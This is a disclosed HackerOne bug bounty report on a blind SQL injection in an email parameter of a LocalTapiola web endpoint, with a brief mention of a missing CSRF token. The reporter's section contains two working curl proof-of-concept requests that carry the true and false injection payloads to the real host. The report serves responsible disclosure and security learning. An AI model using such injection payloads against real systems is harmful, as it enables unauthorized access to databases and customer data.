@@ -1,0 +1,46 @@
+ReportLink:https://hackerone.com/reports/191601
+WeaknessName:SQL Injection
+Reporter:https://hackerone.com/jimmyjohns
+ReportedTo:LocalTapiola(localtapiola)
+BountyAmount:1350.0
+Severity:medium
+State:Closed
+DateOfDisclosure:28.01.2017 18:48:14
+
+Summary:
+##Issue
+
+The reporter found an SQL injection in one of the applications in viestinta.lahitapiola.fi. 
+
+##Fix
+
+The issue was investigated and found to be valid and critical. 
+
+##Reasoning
+
+The reported case was valid and right on target for the scope of the bug bounty program. SQL injections are always critical as they pose a serious threat to the underlying database and the information therein.  The award is based on risk - the underlying infrastructure and database contained a limited set of non-public customer related information.
+Moi! This is my first report - please bear with me...
+
+**Summary:**  Boolean based blind SQL injection in /webApp/sijoitustalousuk endpoint and potential lack of CSRF Token
+
+**Description:** I detected that the email parameter of the POST request to http://viestinta.lahitapiola.fi/webApp/sijoitustalousuk is evaluated. Two different statements appended to an email address cause different responses from the server.
+PoC below to replay with curl.
+
+## Steps To Reproduce:
+True statement: Response Content-Length -> 2393
+`curl -i -s -k  -X $'POST' \
+    -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'Referer: http://www.lahitapiola.fi/henkilo/sivut/lahitapiolan-uutiskirjeet' -H $'Content-Type: application/x-www-form-urlencoded' \
+    -b $'AMCV_8041A77B5656DBF07F000101%40AdobeOrg=-227196251%7CMCIDTS%7C17152%7CMCMID%7C80973514433021911535315148330980113730%7CMCAID%7CNONE%7CMCOPTOUT-1481863743s%7CNONE%7CMCAAMLH-1482461342%7C6%7CMCAAMB-1482461343%7Chmk_Lq6TPIBMW925SPhw3Q; AMCVS_8041A77B5656DBF07F000101%40AdobeOrg=1; _sdsat_Website version=1.90; s_cc=true; s_sq=%5B%5BB%5D%5D; ARCSessionInfo=1%7C1481857037073; __atuvc=1%7C50; __atuvs=58535810158d836f000' \
+    --data-binary $'email=winter@example.com13319082\'%20or%20\'6519\'%3d\'6519' \
+    $'http://viestinta.lahitapiola.fi/webApp/sijoitustalousuk'`
+
+False statement: Response Content-Length: -> 1103
+`curl -i -s -k  -X $'POST' \
+    -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'Referer: http://www.lahitapiola.fi/henkilo/sivut/lahitapiolan-uutiskirjeet' -H $'Content-Type: application/x-www-form-urlencoded' \
+    -b $'AMCV_8041A77B5656DBF07F000101%40AdobeOrg=-227196251%7CMCIDTS%7C17152%7CMCMID%7C80973514433021911535315148330980113730%7CMCAID%7CNONE%7CMCOPTOUT-1481863743s%7CNONE%7CMCAAMLH-1482461342%7C6%7CMCAAMB-1482461343%7Chmk_Lq6TPIBMW925SPhw3Q; AMCVS_8041A77B5656DBF07F000101%40AdobeOrg=1; _sdsat_Website version=1.90; s_cc=true; s_sq=%5B%5BB%5D%5D; ARCSessionInfo=1%7C1481857037073; __atuvc=1%7C50; __atuvs=58535810158d836f000' \
+    --data-binary $'email=winter@example.com13319082\'%20or%20\'6519\'%3d\'6520' \
+    $'http://viestinta.lahitapiola.fi/webApp/sijoitustalousuk'`
+
+Additionally, it seems anyone's email can be registered to Neolane as there's no CSRF token in the form. I did not find an "unsubscribe" feature but I'm guessing there has to be one for privacy reasons. Someone could potentially remove entries from the subscribers list.
+
+Hope this helps!
